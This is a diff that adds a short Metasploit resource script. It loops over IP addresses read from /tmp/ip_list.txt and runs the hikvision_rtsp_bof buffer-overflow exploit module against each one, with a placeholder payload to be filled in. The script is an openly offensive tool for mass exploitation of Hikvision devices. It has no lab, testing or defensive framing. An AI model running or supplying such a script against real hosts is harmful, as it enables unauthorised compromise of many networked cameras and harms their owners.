@@ -1,0 +1,22 @@
+<ruby>
+#
+# Modify the path if necessary
+#
+ip_list = '/tmp/ip_list.txt'
+
+File.open(ip_list, 'rb').each_line do |ip|
+  print_status("Trying against #{ip}")
+  run_single("use exploit/linux/misc/hikvision_rtsp_bof")
+  run_single("set RHOST #{ip}")
+  run_single("set DisablePayloadHandler true")
+
+  #
+  # Set a payload that's the same as the handler.
+  # You might also need to add more run_single commands to configure other
+  # payload options.
+  #
+  run_single("set PAYLOAD [payload name]")
+
+  run_single("run")
+end
+</ruby>
